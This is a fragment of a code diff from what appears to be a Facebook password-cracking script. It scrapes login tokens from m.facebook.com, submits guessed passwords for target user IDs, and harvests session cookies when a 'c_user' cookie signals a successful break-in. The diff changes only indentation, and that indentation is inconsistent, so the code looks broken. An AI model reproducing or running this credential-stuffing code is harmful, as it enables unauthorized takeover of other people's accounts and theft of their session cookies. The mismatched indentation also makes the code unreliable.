@@ -578,16 +578,16 @@ def _M5_(ids,pasx):
 				"referer":"https://m.facebook.com/",
 				"accept-encoding":"gzip, deflate br",
 				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+			   p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			   dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
 				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
 				"uid":ids,
 				"next":"https://p.facebook.com/login/save-device/",
 				"flow":"login_no_pin",
 				"pass":psb,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade = {'Host': 'm.facebook.com', 
+			  koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			  koki+=' m_pixel_ratio=2.625; wd=412x756'
+			  heade = {'Host': 'm.facebook.com', 
 				'viewport-width': '980', 
 				'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 
 				'sec-ch-ua-mobile': '?0', 
@@ -603,7 +603,7 @@ def _M5_(ids,pasx):
 				'sec-fetch-dest': 'document', 
 				'accept-encoding': 'gzip, deflate, br', 
 				'accept-language': 'en-US,en;q=0.9'}
-			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			 po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             BLACK=session.cookies.get_dict().keys()
             if 'c_user' in BLACK:
             coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
